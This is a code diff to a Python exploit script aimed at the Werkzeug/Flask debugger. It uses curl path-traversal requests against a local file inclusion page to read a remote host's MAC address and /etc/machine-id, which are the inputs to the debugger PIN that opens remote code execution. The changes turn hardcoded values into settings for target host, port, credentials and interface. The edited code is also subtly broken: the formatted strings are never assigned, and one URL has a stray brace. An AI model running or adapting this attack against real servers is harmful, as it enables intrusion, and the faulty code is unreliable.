@@ -4,19 +4,40 @@ import subprocess
 import hashlib
 from itertools import chain
 
-maccmd = "/usr/bin/curl -sX GET --url 'http://<IP>:<port>/<lfi_page_dir>?filename=../../../../../sys/class/net/<interface>/address' -u '<user>:<passwd>' | tr -d ':' | tr -d '\n'"
-idcmd = "/usr/bin/curl -sX GET --url 'http://<IP>:<port>/<lfi_page_dir>?filename=../../../../../etc/machine-id' -u '<user>:<passwd>' | tr -d '\n'"
-get_node = str(int(subprocess.check_output(maccmd.strip(),shell=True,text=True), base=16))
-get_machine_id = subprocess.check_output(idcmd.strip(),shell=True,text=True)
+user = ''   # Username to authenticate to Werkzeug
+passwd = '' # Password to authenticate to Werkzeug
+iface = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
+rhost = ''  # IP address or hostname of the remote system hosting Werkzeug
+rport = ''  # Remote Port number of the service to access should be an integer, not a string.
+lfi_page_dir = ''
+
+werk_user = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.
+
+maccmd = "/usr/bin/curl -sX GET \
+    --url 'http://{2}:{3}/{4}?filename=../../../../../sys/class/net/{5}/address' \
+        -u '{0}:{1}' | tr -d ':' | tr -d '\n'"
+idcmd = "/usr/bin/curl -sX GET \
+    --url 'http://{2}:{3}}/{4}?filename=../../../../../etc/machine-id' \
+        -u '{0}:{1}' | tr -d '\n'"
+
+maccmd.format(user, passwd, rhost, rport, lfi_page_dir, iface)
+idcmd.format(user, passwd, rhost, rport, lfi_page_dir)
+
+get_node = str(int(subprocess.check_output(maccmd.strip(), shell=True, text=True), base=16))
+get_machine_id = subprocess.check_output(idcmd.strip(), shell=True, text=True)
 
 # probably_public_bits = [username, modname,
 #                         getattr(app, '__name__', getattr(app.__class__, '__name__')),
 #                         getattr(mod, '__file__', None)
 #                         ]
-probably_public_bits = ['aas', 'flask.app', 'Flask',
-                        '/usr/local/lib/python2.7/dist-packages/flask/app.pyc']
+probably_public_bits = [
+    werk_user,
+    'flask.app',
+    'Flask',
+    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'
+    ]
 
-# uuid.getnode() -> /sys/class/net/ens33/address
+# uuid.getnode() -> /sys/class/net/<interface>/address
 # get_machine_id() -> /etc/machine-id
 # private_bits = [str(uuid.getnode()), get_machine_id()]
 private_bits = [
